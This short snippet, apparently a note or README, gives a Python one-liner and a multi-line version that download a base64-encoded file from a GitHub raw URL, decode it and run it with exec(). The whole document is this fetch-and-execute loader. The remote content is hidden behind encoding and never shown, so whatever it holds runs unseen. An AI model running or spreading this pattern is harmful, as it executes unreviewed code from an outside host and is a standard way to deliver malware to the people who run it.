One-Liner: import requests; import base64; import json; data = requests.get('https://raw.githubusercontent.com/TheCodeFox-tech/PythonRemoteTest/main/Test.json'); exec(base64.b64decode(data.text).decode('utf-8'))
Multi-Liner: 
import requests
import base64
import json
data = requests.get('https://raw.githubusercontent.com/TheCodeFox-tech/PythonRemoteTest/main/Test.json')
exec(base64.b64decode(data.text).decode('utf-8'))
